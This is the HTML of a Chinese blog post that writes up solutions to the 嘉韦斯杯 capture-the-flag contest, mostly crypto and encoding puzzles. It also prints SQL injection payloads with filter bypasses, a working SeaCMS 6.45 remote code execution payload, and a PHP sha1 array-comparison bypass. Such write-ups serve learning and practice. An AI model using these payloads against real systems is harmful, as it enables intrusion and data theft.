@@ -1,0 +1,476 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>嘉韦斯杯Writeup | Cryscat&#39;s Blog | 一只安全狗</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#000000">
+    
+    
+    <meta name="keywords" content="Writeup,嘉韦斯,华东师范大学">
+    <meta name="description" content="壹一道SQL注入题，直接上sqlmap跑 贰打开链接，主页是一长串字符，base64解密，解出来是一段JSfuck编码，直接丢进浏览器的控制台，出flag 叁主页是一串十六进制的运算式，题目说要我们2秒内计算出结果并提交，所以这一题要靠脚本解决（正则表达式不会写，在正则表达式网站试了试，得出了能将式子全都提取出来的正则表达式，之后再进行一个式子截取，去掉其他无关字符）脚本：12345678910">
+<meta name="keywords" content="Writeup,嘉韦斯,华东师范大学">
+<meta property="og:type" content="article">
+<meta property="og:title" content="嘉韦斯杯Writeup">
+<meta property="og:url" content="http://www.cryscat.com/2019/04/01/嘉韦斯杯Writeup/index.html">
+<meta property="og:site_name" content="Cryscat&#39;s Blog">
+<meta property="og:description" content="壹一道SQL注入题，直接上sqlmap跑 贰打开链接，主页是一长串字符，base64解密，解出来是一段JSfuck编码，直接丢进浏览器的控制台，出flag 叁主页是一串十六进制的运算式，题目说要我们2秒内计算出结果并提交，所以这一题要靠脚本解决（正则表达式不会写，在正则表达式网站试了试，得出了能将式子全都提取出来的正则表达式，之后再进行一个式子截取，去掉其他无关字符）脚本：12345678910">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://www.cryscat.com/2019/04/01/嘉韦斯杯Writeup/1.jpg">
+<meta property="og:image" content="http://www.cryscat.com/2019/04/01/嘉韦斯杯Writeup/2.jpg">
+<meta property="og:image" content="http://www.cryscat.com/2019/04/01/嘉韦斯杯Writeup/3.jpg">
+<meta property="og:image" content="http://www.cryscat.com/2019/04/01/嘉韦斯杯Writeup/4.jpg">
+<meta property="og:image" content="http://www.cryscat.com/2019/04/01/嘉韦斯杯Writeup/5.jpg">
+<meta property="og:image" content="http://www.cryscat.com/2019/04/01/嘉韦斯杯Writeup/6.jpg">
+<meta property="og:image" content="http://www.cryscat.com/2019/04/01/嘉韦斯杯Writeup/7.jpg">
+<meta property="og:image" content="http://www.cryscat.com/2019/04/01/嘉韦斯杯Writeup/8.jpg">
+<meta property="og:image" content="http://www.cryscat.com/2019/04/01/嘉韦斯杯Writeup/9.jpg">
+<meta property="og:image" content="http://www.cryscat.com/2019/04/01/嘉韦斯杯Writeup/10.jpg">
+<meta property="og:updated_time" content="2019-04-01T16:36:42.886Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="嘉韦斯杯Writeup">
+<meta name="twitter:description" content="壹一道SQL注入题，直接上sqlmap跑 贰打开链接，主页是一长串字符，base64解密，解出来是一段JSfuck编码，直接丢进浏览器的控制台，出flag 叁主页是一串十六进制的运算式，题目说要我们2秒内计算出结果并提交，所以这一题要靠脚本解决（正则表达式不会写，在正则表达式网站试了试，得出了能将式子全都提取出来的正则表达式，之后再进行一个式子截取，去掉其他无关字符）脚本：12345678910">
+<meta name="twitter:image" content="http://www.cryscat.com/2019/04/01/嘉韦斯杯Writeup/1.jpg">
+    
+        <link rel="alternate" type="application/atom+xml" title="Cryscat&#39;s Blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link rel="stylesheet" href="/css/style.css?v=1.7.2">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+</head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu">
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/mm.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Cryscat</h5>
+          <a href="mailto:cry3c4t@gmail.com" title="cry3c4t@gmail.com" class="mail">cry3c4t@gmail.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/">
+                <i class="icon icon-lg icon-home"></i>
+                Home
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives">
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags">
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/Cryscat" target="_blank">
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://www.zhihu.com/people/kaka-64-40/activities" target="_blank">
+                <i class="icon icon-lg icon-book"></i>
+                Zhihu
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://twitter.com/kaka27258546" target="_blank">
+                <i class="icon icon-lg icon-twitter"></i>
+                Twitter
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/aboutme">
+                <i class="icon icon-lg icon-black-tie"></i>
+                About_me
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">嘉韦斯杯Writeup</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">嘉韦斯杯Writeup</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2019-04-01T15:38:32.000Z" itemprop="datePublished" class="page-time">
+  2019-04-01
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#壹"><span class="post-toc-number">1.</span> <span class="post-toc-text">壹</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#贰"><span class="post-toc-number">2.</span> <span class="post-toc-text">贰</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#叁"><span class="post-toc-number">3.</span> <span class="post-toc-text">叁</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#肆"><span class="post-toc-number">4.</span> <span class="post-toc-text">肆</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#伍"><span class="post-toc-number">5.</span> <span class="post-toc-text">伍</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#陆"><span class="post-toc-number">6.</span> <span class="post-toc-text">陆</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#柒"><span class="post-toc-number">7.</span> <span class="post-toc-text">柒</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#捌"><span class="post-toc-number">8.</span> <span class="post-toc-text">捌</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#玖"><span class="post-toc-number">9.</span> <span class="post-toc-text">玖</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#拾"><span class="post-toc-number">10.</span> <span class="post-toc-text">拾</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#拾壹"><span class="post-toc-number">11.</span> <span class="post-toc-text">拾壹</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#后记"><span class="post-toc-number">12.</span> <span class="post-toc-text">后记</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-嘉韦斯杯Writeup" class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">嘉韦斯杯Writeup</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2019-04-01 23:38:32" datetime="2019-04-01T15:38:32.000Z" itemprop="datePublished">2019-04-01</time>
+
+            
+
+
+            
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <img src="/2019/04/01/嘉韦斯杯Writeup/1.jpg">
+<h1 id="壹"><a href="#壹" class="headerlink" title="壹"></a>壹</h1><p>一道SQL注入题，直接上sqlmap跑<br><img src="/2019/04/01/嘉韦斯杯Writeup/2.jpg"></p>
+<h1 id="贰"><a href="#贰" class="headerlink" title="贰"></a>贰</h1><p>打开链接，主页是一长串字符，base64解密，解出来是一段JSfuck编码，直接丢进浏览器的控制台，出flag</p>
+<h1 id="叁"><a href="#叁" class="headerlink" title="叁"></a>叁</h1><p>主页是一串十六进制的运算式，题目说要我们2秒内计算出结果并提交，所以这一题要靠脚本解决（正则表达式不会写，在正则表达式网站试了试，得出了能将式子全都提取出来的正则表达式，之后再进行一个式子截取，去掉其他无关字符）<br>脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://47.103.43.235:82/web/a/index.php'</span></span><br><span class="line">r = requests.session()</span><br><span class="line">res = r.get(url).text</span><br><span class="line">cont = re.findall(<span class="string">'-?[0-9xABCDEF]\d*[\+\-\*\%\^/( )]*'</span>,res)</span><br><span class="line">cont = <span class="string">""</span>.join(cont)</span><br><span class="line">resu = eval(cont[<span class="number">1</span>:<span class="number">59</span>])</span><br><span class="line">data = &#123;<span class="string">'result'</span>:resu&#125;</span><br><span class="line">ans = r.post(url,data = data)</span><br><span class="line">print(ans.text)</span><br></pre></td></tr></table></figure></p>
+<p>赛后专门琢磨了html内容提取，本体还可以用<code>str.split(&quot;&lt;p&gt;&quot;)</code>和<code>str.split(&quot;&lt;/p&gt;&quot;)</code>进行截取，截取方式不唯一，自己喜欢的才是最好的┓( ´-` )┏</p>
+<h1 id="肆"><a href="#肆" class="headerlink" title="肆"></a>肆</h1><p>打开链接是一张二维码图片，保存到本地，用binwalk分离出其中的压缩包<br><img src="/2019/04/01/嘉韦斯杯Writeup/3.jpg"><br>压缩包中有一个key.txt文件，flag应该就在里面了，解压发现需要密码，首先尝试伪加密破解，无果，应该是实打实的加密了，开始爆破密码，爆出密码：674290437，查看key.txt获得flag</p>
+<h1 id="伍"><a href="#伍" class="headerlink" title="伍"></a>伍</h1><p>神奇的密码1</p>
+<p>又是一长串的字符，看出是base64，进行解密，又是一层base64，其中解出的base64编码的=都是%3D表示的。要将这部分url编码换成=再进行解码。最后解出得到fB__l621a4h4g_ai%7B%26i%7D<br>将其中的url编码解码得到fB__l621a4h4g_ai{&amp;i}<br>可以看到这像是一段打乱顺序的flag，试试栅栏密码、凯撒密码和列移位密码<br>最终在栅栏密码5字一组的时候试出flag{B64_&amp;_2hai_14i}</p>
+<h1 id="陆"><a href="#陆" class="headerlink" title="陆"></a>陆</h1><p>神奇的密码2</p>
+<p>题目给了一串字符：bg[`sZ*Zg’dPfP`VM_SXVd<br>密码学的题，没多大头绪，规律是学长找出来的<br>脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">str=<span class="string">'bg[`sZ*Zg\'dPfP`VM_SXVd'</span></span><br><span class="line">strlen=len(str)</span><br><span class="line">i=<span class="number">3</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> str:</span><br><span class="line">	i=i+<span class="number">1</span></span><br><span class="line">	flag=flag+chr(ord(c)+i)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure></p>
+<h1 id="柒"><a href="#柒" class="headerlink" title="柒"></a>柒</h1><p>又是一道SQL注入题，这题鼓捣了好久！</p>
+<p>经过测试发现id=后面是以base64加密逆序输入的，过滤了<code>or</code>、<code>=</code>、<code>”</code>、<code>&#39;</code>、<code>union</code>、<code>select</code>，并且不需要闭合引号</p>
+<blockquote>
+<p>爆库：<br>0/<strong>/uunionnion/</strong>/selselectect/**/1,2,3,4,5,database()#<br>=MSKoU2chJWY0FGZsUDL0wyMsIDLx8iKq8CdjVGdjVGblNHblN3LqoyLu9Wau52bp5Wd19iKq8CM</p>
+</blockquote>
+<blockquote>
+<p>爆表：<br>0/<strong>/uunionnion/</strong>/selselectect/<strong>/1,2,3,4,5,table_name/</strong>/from/<strong>/infoorrmation_schema.tables/</strong>/where/<strong>/table_schema/</strong>/like/**/database()#<br>=owIpgSZzFmYhRXYk9iKq8SZrlGbvoiKvEWblh2Yz9VZsJWY09iKq8SZyVGa39iKq8yclxmYhRnLh1WZoN2cf52bpRXYtJncv9mZul2LqoyLt9mcm9iKq8SZtFmbfVGbiFGdsUDL0wyMsIDLx8iKq8CdjVGdjVGblNHblN3LqoyLu9Wau52bp5Wd19iKq8CM</p>
+</blockquote>
+<blockquote>
+<p>爆列：<br>0/<strong>/uunionnion/</strong>/selselectect/<strong>/1,2,3,4,5,column_name/</strong>/from/<strong>/infoorrmation_schema.columns/</strong>/where/<strong>/table_name/</strong>/like/**/0x666C6167 #<br>=MCI3YTM2MkN2YDew8iKq8SZrlGbvoiKvUWbh52XlxmYhR3LqoyLlJXZod3LqoyLz5Wb1x2bj5SYtVGajN3Xu9Wa0FWbyJ3bvZmbp9iKq8SbvJnZvoiKvUWbh52Xu1Wds92YsUDL0wyMsIDLx8iKq8CdjVGdjVGblNHblN3LqoyLu9Wau52bp5Wd19iKq8CM</p>
+</blockquote>
+<blockquote>
+<p>最后payload：<br>0/<strong>/uniunionon/</strong>/seselectlect/<strong>/1,2,3,4,5,flag/</strong>/from/**/flag#<br>jcWYsZ2LqoyLt9mcm9iKq8yZhxmZsUDL0wyMsIDLx8iKq8CdjVGb0NWZsV2clN3LqoyLu9mbvlmb1lmb19iKq8CM</p>
+</blockquote>
+<img src="/2019/04/01/嘉韦斯杯Writeup/4.jpg">
+<h1 id="捌"><a href="#捌" class="headerlink" title="捌"></a>捌</h1><p>上Kali的openssl，其中e就是exponent的值，转成十进制：<br><img src="/2019/04/01/嘉韦斯杯Writeup/5.jpg"></p>
+<p>将解出的这串数字进行因式分解（<a href="http://factordb.com）" target="_blank" rel="noopener">http://factordb.com）</a><br><img src="/2019/04/01/嘉韦斯杯Writeup/6.jpg"></p>
+<p>最后用python脚本进行解密：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8 </span></span><br><span class="line"><span class="keyword">import</span> gmpy </span><br><span class="line"><span class="keyword">import</span> rsa </span><br><span class="line">p = <span class="number">273821108020968288372911424519201044333</span></span><br><span class="line">q = <span class="number">280385007186315115828483000867559983517</span></span><br><span class="line">n = <span class="number">76775333340223961139427050707840417811156978085146970312315886671546666259161</span></span><br><span class="line">e = <span class="number">65537</span> </span><br><span class="line">d = int(gmpy.invert(e , (p<span class="number">-1</span>) * (q<span class="number">-1</span>))) </span><br><span class="line">privatekey = rsa.PrivateKey(n , e , d , p , q)      <span class="comment">#根据已知参数，计算私钥 </span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"fllllllag.txt"</span> , <span class="string">"rb"</span>) <span class="keyword">as</span> f: </span><br><span class="line">    print(rsa.decrypt(f.read(), privatekey).decode())   <span class="comment">#使用私钥对密文进行解密，并打印</span></span><br></pre></td></tr></table></figure></p>
+<img src="/2019/04/01/嘉韦斯杯Writeup/7.jpg">
+<h1 id="玖"><a href="#玖" class="headerlink" title="玖"></a>玖</h1><p>seacms</p>
+<p>这道题是直接利用海洋CMS 6.45版本前台getshell漏洞的payload打下来的<br>Payload：</p>
+<blockquote>
+<p>searchtype=5&amp;searchword={if{searchpage:year}&amp;year=:e{searchpage:area}}&amp;area=v{searchpage:letter}&amp;letter=al{searchpage:lang}&amp;yuyan=(join{searchpage:jq}&amp;jq=($_P{searchpage:ver}&amp;ver=OST[9]))&amp;9[]=sy&amp;9[]=stem(‘cat ../../flag.txt’);</p>
+</blockquote>
+<h1 id="拾"><a href="#拾" class="headerlink" title="拾"></a>拾</h1><p>查看源代码获得提示index.phps，得到主页源代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$flag = <span class="string">'********'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'name'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">	<span class="keyword">if</span> ($_POST[<span class="string">'name'</span>] == $_POST[<span class="string">'password'</span>])</span><br><span class="line">		<span class="keyword">print</span> <span class="string">'name and password must be diffirent'</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (sha1($_POST[<span class="string">'name'</span>]) === sha1($_POST[<span class="string">'password'</span>]))</span><br><span class="line">		<span class="keyword">die</span>($flag);</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">print</span> <span class="string">'invalid password'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>题目的关键点是name和password传入的内容要不同并且name和password的sha1值类型和内容都相同。那么就是主要考虑sha1对比的绕过。sha1函数要求传入的参数是字符串类型，那传入两个比如数组类型，结果就都是false,这样就会输出flag了<br><img src="/2019/04/01/嘉韦斯杯Writeup/8.jpg"></p>
+<h1 id="拾壹"><a href="#拾壹" class="headerlink" title="拾壹"></a>拾壹</h1><p>查看网页源代码<br><img src="/2019/04/01/嘉韦斯杯Writeup/9.jpg"></p>
+<p>这道题上来首先就将我们传入的param1和param2类型转化为string，所以是不能通过数组绕过了。直接在网上搜了这样的两个值post上去：<br><img src="/2019/04/01/嘉韦斯杯Writeup/10.jpg"></p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>这次比赛一共15道题，有四道没做出来，两道脑洞题，两道逆向（逆向真不是谁都能玩的啊！）。其中有一道希尔密码的题花的时间最多（关于希尔密码的加密解密有兴趣的同学可以自行百度，这里不再赘述），脚本是历经千辛万苦找到了，但最后flag还是不对……于是我去问了主办方，主办方说是这题有脑洞！！！行吧！<br>希尔密码解密脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">Ma=[</span><br><span class="line">    <span class="number">1</span>,<span class="number">4</span>,<span class="number">7</span>,</span><br><span class="line">    <span class="number">2</span>,<span class="number">5</span>,<span class="number">8</span>,</span><br><span class="line">    <span class="number">3</span>,<span class="number">6</span>,<span class="number">10</span></span><br><span class="line">   ]</span><br><span class="line">code=[</span><br><span class="line">      <span class="number">23</span>,<span class="number">10</span>,<span class="number">12</span>,</span><br><span class="line">      <span class="number">24</span>,<span class="number">16</span>,<span class="number">2</span>,</span><br><span class="line">      <span class="number">25</span>,<span class="number">3</span>,<span class="number">9</span>,</span><br><span class="line">      <span class="number">0</span>,<span class="number">9</span>,<span class="number">5</span></span><br><span class="line">     ]</span><br><span class="line">answer=[]</span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">12</span>,<span class="number">3</span>):</span><br><span class="line">    flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">99</span>,<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">99</span>,<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">99</span>,<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span> ((<span class="number">1</span>*i + <span class="number">4</span>*j + <span class="number">7</span>*k)%<span class="number">26</span> == code[t]  <span class="keyword">and</span></span><br><span class="line">                    (<span class="number">2</span>*i + <span class="number">5</span>*j + <span class="number">8</span>*k)%<span class="number">26</span> ==  code[t+<span class="number">1</span>] <span class="keyword">and</span></span><br><span class="line">                     (<span class="number">3</span>*i + <span class="number">6</span>*j + <span class="number">10</span>*k)%<span class="number">26</span> == code[t+<span class="number">2</span>]):</span><br><span class="line">                    answer.append(i)</span><br><span class="line">                    answer.append(j)</span><br><span class="line">                    answer.append(k)</span><br><span class="line">                    flag = <span class="number">1</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span>(flag):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span>(flag):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span>(flag):</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"><span class="keyword">print</span> (answer)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> answer:</span><br><span class="line">    <span class="keyword">print</span> (chr(i + <span class="number">97</span>),end=<span class="string">""</span>)</span><br></pre></td></tr></table></figure></p>
+<p>其中Ma是加密矩阵的逆矩阵，code是密文各字母对应的数字编码</p>
+<p>比赛陆陆续续开始多起来了，好好加油吧！<br>菜就是原罪！</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <footer>
+        <a href="http://www.cryscat.com">
+            <img src="/img/avatar.jpg" alt="Cryscat">
+            Cryscat
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Writeup/">Writeup</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/华东师范大学/">华东师范大学</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/嘉韦斯/">嘉韦斯</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.cryscat.com/2019/04/01/嘉韦斯杯Writeup/&title=《嘉韦斯杯Writeup》 — Cryscat's Blog&pic=http://www.cryscat.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.cryscat.com/2019/04/01/嘉韦斯杯Writeup/&title=《嘉韦斯杯Writeup》 — Cryscat's Blog&source=在信安界苟延残喘" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.cryscat.com/2019/04/01/嘉韦斯杯Writeup/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《嘉韦斯杯Writeup》 — Cryscat's Blog&url=http://www.cryscat.com/2019/04/01/嘉韦斯杯Writeup/&via=http://www.cryscat.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.cryscat.com/2019/04/01/嘉韦斯杯Writeup/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2019/03/10/西北大学moeCTF-Web/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">西北大学moeCTF-Web</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="bottom">
+        <p><span>Cryscat &copy; 2018 - 2019</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.cryscat.com/2019/04/01/嘉韦斯杯Writeup/&title=《嘉韦斯杯Writeup》 — Cryscat's Blog&pic=http://www.cryscat.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.cryscat.com/2019/04/01/嘉韦斯杯Writeup/&title=《嘉韦斯杯Writeup》 — Cryscat's Blog&source=在信安界苟延残喘" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.cryscat.com/2019/04/01/嘉韦斯杯Writeup/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《嘉韦斯杯Writeup》 — Cryscat's Blog&url=http://www.cryscat.com/2019/04/01/嘉韦斯杯Writeup/&via=http://www.cryscat.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.cryscat.com/2019/04/01/嘉韦斯杯Writeup/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
